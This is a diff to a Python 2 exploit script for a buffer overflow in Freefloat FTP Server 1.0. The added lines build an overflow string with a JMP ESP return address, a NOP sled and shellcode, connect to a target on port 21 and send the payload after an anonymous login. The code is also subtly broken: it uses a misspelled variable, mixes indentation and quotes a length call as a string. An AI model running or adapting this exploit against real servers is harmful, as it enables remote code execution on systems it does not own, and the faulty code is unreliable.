@@ -10,7 +10,7 @@ import socket, sys, time, struct
 
 if len(sys.argv) < 2:
 	print "[-] Usage:%s <target addr> <command>"% sys.argv[0]+"\r"
-	print "[-] For example [filename.py 192.168.1.10 PWND] would do the trick."
+    print "[-] For example [filename.py 192.168.1.10 PWND] would do the trick."
 	print "[-] Other options: AUTH, APPE, ALLO, ACCT"
 	sys.exit(0)
 target = sys.argv[1]
@@ -48,6 +48,25 @@ shellcode = (
 	"\x86\xa9\x22\xd6\x7d\xb1\x47\xd3\x3a\x75\xb4\xa9\x53\x10"
 	"\xba\x1e\x53\x31"
 	)
+overflow = "\x41" * 246
+ret = struct.pack('<L', 0x7c874413) #7c874413 JMP ESP kernel32.dll
+padding = "\x90" * 150
+crash = overflow+ret+padding+shellcode
+
+print "[*] Freefloat FTP 1.0 any non implemented Command buffer overflow. "
+print "[*] Author: Craig Freeman (@cdlzz)"
+print "[*] Connecting to "+target
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try: 
+	s.connect((target, 21))
+except:
+	print "[-] Connection to "+target+" failed!"
+	sys.exit(0)
+print "[*] Sending "+'len(crash)'+" "+command+" byte crash...."
+s.send("USER anonymous\r\n")
+s.recv(1024)
+s.send(commadn+" "+crash+"\r\n")
+time.sleep(4)
 
 
 
